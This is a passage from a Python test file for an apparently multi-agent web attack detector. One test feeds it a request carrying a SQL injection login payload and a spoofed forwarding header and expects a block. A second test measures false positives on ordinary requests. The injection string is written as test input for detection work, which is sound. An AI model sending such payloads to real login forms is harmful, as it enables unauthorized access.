                'X-Forwarded-For': '10.0.0.1, 172.16.0.1'  # IP spoofing attempt
            },
            'body': 'username=admin&password=%27OR%271%27%3D%271',  # SQL injection
            'method': 'POST',
            'source_ip': '192.168.1.100',
            'timestamp': '2024-01-01T12:00:00Z'
        }
        
        # Act: Coordinated analysis across all agents
        if hasattr(orchestrator, 'coordinate_analysis'):
            result = orchestrator.coordinate_analysis(attack_scenario)
        else:
            pytest.skip("Agent coordination not available")
        
        # Assert: Should detect the attack with high confidence
        final_decision = result['final_decision']
        
        # SQLi should be high threat (> 0.7)
        assert final_decision['threat_level'] > 0.7, \
            f"Complete attack should be high threat: {final_decision['threat_level']}"
        
        # Should recommend blocking or challenging
        assert final_decision['action'] in ['BLOCK', 'CHALLENGE'], \
            f"Should block or challenge attack: {final_decision['action']}"
        
        # Should have high confidence (> 0.6)
        assert final_decision['confidence'] > 0.6, \
            f"Should have high confidence: {final_decision['confidence']}"
        
        # Log the detection results
        print(f"Complete attack detection: "
              f"threat={final_decision['threat_level']:.2f}, "
              f"action={final_decision['action']}, "
              f"confidence={final_decision['confidence']:.2f}")
    
    def test_false_positive_rate(self):
        """Test false positive rate with legitimate traffic"""
        # Skip if agent_orchestrator fixture is not available
        try:
            orchestrator = getattr(self, 'agent_orchestrator', None)
            if orchestrator is None:
                pytest.skip("agent_orchestrator fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Arrange: Legitimate requests that should not be blocked
        legitimate_requests = [
            {
                'name': 'google_search',
                'url': 'https://google.com/search?q=cybersecurity',
                'headers': {'User-Agent': 'Mozilla/5.0'},
                'body': '',
                'method': 'GET'
            },
            {
                'name': 'github_api',
                'url': 'https://api.github.com/user/repos',
                'headers': {'Authorization': 'Bearer ghp_token123'},
                'body': '',
                'method': 'GET'
            },
            {
                'name': 'login_legitimate',
                'url': 'https://example.com/login',
                'headers': {'Content-Type': 'application/json'},
                'body': '{"username": "user123", "password": "securePass123!"}',
                'method': 'POST'
            },
            {
                'name': 'file_upload',
                'url': 'https://example.com/upload',
                'headers': {'Content-Type': 'multipart/form-data'},
                'body': '--boundary\nContent-Disposition: form-data; name="file"; filename="resume.pdf"\n\nPDF content...',
                'method': 'POST'
            }
        ]
        
        false_positives = 0
        total_requests = len(legitimate_requests)
        
        # Test each legitimate request
        for request in legitimate_requests:
            # Act - analyze the legitimate request
            if hasattr(orchestrator, 'coordinate_analysis'):
                result = orchestrator.coordinate_analysis(request)
            else:
                pytest.skip("Agent coordination not available")
            
            # Check if false positive (blocked with high threat)
            final_decision = result['final_decision']
            if final_decision['action'] == 'BLOCK' and final_decision['threat_level'] > 0.7:
                false_positives += 1
                print(f"False positive detected for: {request['name']}")
        
        # Calculate false positive rate
        fp_rate = false_positives / total_requests if total_requests > 0 else 0
        
        # Assert: Should have low false positive rate (< 5%)
        max_fp_rate = 0.05  # 5% maximum acceptable false positive rate
        
        assert fp_rate < max_fp_rate, \
            f"False positive rate too high: {fp_rate*100:.1f}% > {max_fp_rate*100:.0f}%"
        
        # Log the false positive rate
        print(f"False positive rate: {fp_rate*100:.1f}% ({false_positives}/{total_requests})")

# Main entry point for running tests directly
if __name__ == "__main__":
    # Allow running tests directly without pytest command
    pytest.main([__file__, "-v"])